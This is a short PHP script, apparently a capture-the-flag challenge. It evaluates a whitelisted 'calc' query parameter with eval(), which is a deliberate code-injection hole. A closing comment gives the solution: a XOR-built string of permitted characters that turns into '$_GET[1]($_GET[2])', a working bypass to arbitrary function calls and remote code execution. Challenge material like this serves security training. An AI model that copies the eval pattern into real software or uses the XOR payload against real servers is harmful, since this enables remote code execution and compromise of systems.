<?php
error_reporting(0);

if(!isset($_GET["calc"])) 
{
    highlight_file(__FILE__);
}
else
{
    $wl = preg_match('/^[0-9\+\-\*\/\(\)\'\.\~\^\|\&]+$/i', $_GET["calc"]);
    if($wl === 0 || strlen($_GET["calc"]) > 70) {
        die("try again");
    }
    echo 'Result: ';
    $result = eval("return ".$_GET["calc"].";");
    echo $result."\n";
}
# '(9222(1(((9222(2()'^'*^^^^-1+(*^^^^-2+())'^'&8+)8^1^(&8+)8^2^())' to '$_GET[1]($_GET[2])'